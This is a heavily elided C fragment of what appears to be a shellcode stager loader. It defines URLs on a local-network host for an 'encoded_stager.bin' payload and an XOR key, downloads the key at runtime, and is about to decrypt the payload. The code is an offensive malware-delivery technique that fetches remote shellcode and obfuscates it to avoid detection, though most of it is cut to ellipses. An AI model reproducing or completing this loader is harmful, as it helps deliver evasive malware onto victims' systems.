...
//shellcode address & key address 
#define PAYLOAD L"http://192.168.0.122/encoded_stager.bin"
#define KEY L"http://192.168.0.122/key.bin"
...
//Function to download payload and key on runtime
...
int main() {
	...
	//Download key
	if (!GetPayloadFromUrl(KEY, &key, &keySize)) {
		return -3;
	}

	Sleep(500);

	//xor encrypted payload with retrieved key
